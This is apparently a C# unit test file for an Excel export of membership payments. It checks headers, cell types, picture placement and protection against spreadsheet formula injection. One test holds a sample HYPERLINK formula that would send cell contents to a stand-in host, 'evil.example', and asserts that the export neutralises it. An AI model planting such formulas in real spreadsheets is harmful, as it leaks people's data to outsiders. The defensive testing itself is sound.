using ClosedXML.Excel;
using PSMPE.Portal.Application.Payments.Export;
using Xunit;

namespace PSMPE.Portal.Application.UnitTests.Payments;

public class PaymentExportWorkbookTests
{
    private static PaymentExportRow Row(
        string fullName = "Juan Dela Cruz", string? mobile = "09170000001", ProofPicture? picture = null, string? note = "No proof on file", string reference = "REF-1") =>
        new(fullName, "juan@example.com", "12 Sample St., Sample City", mobile, 1700m, reference,
            new DateOnly(2026, 8, 29), picture, note, "New membership");

    private static IXLWorksheet Open(params PaymentExportRow[] rows) =>
        new XLWorkbook(new MemoryStream(PaymentExportWorkbook.Build(rows))).Worksheet("Awaiting Verification");

    [Fact]
    public void Build_WritesHeadersInTheAgreedOrderAndFreezesThem()
    {
        var sheet = Open();

        var headers = Enumerable.Range(1, 9).Select(c => sheet.Cell(1, c).GetString());
        Assert.Equal(
            ["Full Name", "Email", "Address", "CP Number", "Amount", "Reference", "Paid On", "Proof of Payment", "For"],
            headers);
        Assert.Equal(1, sheet.SheetView.SplitRow);
    }

    [Fact]
    public void Build_WritesEachValueToItsColumnWithTheRightType()
    {
        var sheet = Open(Row());

        Assert.Equal("Juan Dela Cruz", sheet.Cell(2, 1).GetString());
        Assert.Equal("juan@example.com", sheet.Cell(2, 2).GetString());
        Assert.Equal("12 Sample St., Sample City", sheet.Cell(2, 3).GetString());
        Assert.Equal(XLDataType.Number, sheet.Cell(2, 5).DataType);
        Assert.Equal(1700d, sheet.Cell(2, 5).GetDouble());
        Assert.Equal("REF-1", sheet.Cell(2, 6).GetString());
        Assert.Equal(XLDataType.DateTime, sheet.Cell(2, 7).DataType);
        Assert.Equal(new DateTime(2026, 8, 29), sheet.Cell(2, 7).GetDateTime());
        Assert.Equal("New membership", sheet.Cell(2, 9).GetString());
        Assert.Contains("₱", sheet.Cell(2, 5).Style.NumberFormat.Format);
        Assert.Equal("mm/dd/yyyy", sheet.Cell(2, 7).Style.NumberFormat.Format);
    }

    [Theory]
    [InlineData("09170000001")]
    [InlineData("+639170000001")]
    public void Build_KeepsMobileNumbersAsText(string mobile)
    {
        var cell = Open(Row(mobile: mobile)).Cell(2, 4);

        Assert.Equal(XLDataType.Text, cell.DataType);
        Assert.Equal(mobile, cell.GetString());
    }

    [Theory]
    [InlineData("=1+1", "'=1+1")]
    [InlineData("+1+1", "'+1+1")]
    [InlineData("-1+1", "'-1+1")]
    [InlineData("@SUM(A1)", "'@SUM(A1)")]
    [InlineData("'=1+1", "'=1+1")]
    [InlineData("'Tis", "'Tis")]
    [InlineData(" =1+1", "' =1+1")]
    public void Build_NeverTurnsMemberTextIntoAFormula(string value, string expected)
    {
        var cell = Open(Row(fullName: value)).Cell(2, 1);

        Assert.False(cell.HasFormula);
        Assert.Equal(expected, cell.GetString());
    }

    [Fact]
    public void Build_NeutralisesFormulasInTheReferenceColumn()
    {
        const string evil = "=HYPERLINK(\"http://evil.example/?\"&A3,\"Open\")";

        var cell = Open(Row(reference: evil)).Cell(2, 6);

        Assert.False(cell.HasFormula);
        Assert.Equal("'" + evil, cell.GetString());
    }

    [Fact]
    public void Build_LeavesASingleCharacterReferenceAlone()
    {
        Assert.Equal("-", Open(Row(reference: "-")).Cell(2, 6).GetString());
    }

    [Fact]
    public void Build_EmbedsAVeryThinPictureWithNonZeroHeight()
    {
        var picture = new ProofPicture(ProofFixtures.Jpeg(1000, 6), 1000, 6);

        var sheet = Open(Row(picture: picture, note: null));

        Assert.True(Assert.Single(sheet.Pictures).Height > 0);
    }

    [Fact]
    public void Build_EmbedsPictureInTheProofColumnOfItsRow()
    {
        var picture = new ProofPicture(ProofFixtures.Jpeg(1000, 500), 1000, 500);

        var sheet = Open(Row(), Row(picture: picture, note: null));

        var embedded = Assert.Single(sheet.Pictures);
        Assert.Equal(3, embedded.TopLeftCell.Address.RowNumber);
        Assert.Equal(8, embedded.TopLeftCell.Address.ColumnNumber);
        Assert.Equal("No proof on file", sheet.Cell(2, 8).GetString());
        Assert.Equal(string.Empty, sheet.Cell(3, 8).GetString());
    }
}
